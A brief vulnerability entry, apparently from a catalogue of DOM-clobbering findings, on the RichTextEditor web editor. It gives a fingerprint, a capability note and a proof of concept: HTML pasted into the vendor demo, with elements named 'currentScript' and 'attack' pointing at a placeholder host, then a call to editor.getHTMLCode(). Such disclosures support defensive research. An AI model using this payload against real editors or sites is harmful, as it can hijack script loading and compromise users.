## RichTextEditor

### Meta

+ Library: RichTextEditor
+ Version: Latest
+ Stars: N/A
+ Fingerprint: `document.getElementsByClassName('richtexteditor').length > 0`
+ Input: Copy&Paste
+ Sanitizer: N/A
+ Capability: Any Tag & Any named property
+ CVE: N/A
+ Status: N/A

### Library

https://richtexteditor.com/

### Vulnerable Code Snippet & PoC 

Goto the following URL:
https://richtexteditor.com/Demos/

Copy & Paste the following rendered HTML elements to the editor:
```
<img name="currentScript" src="https://xxx.xxx.xxx">
<img name="attack" src="https://xxx.xxx.xxx">
<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
```

Run the following code:
```
editor.getHTMLCode()
```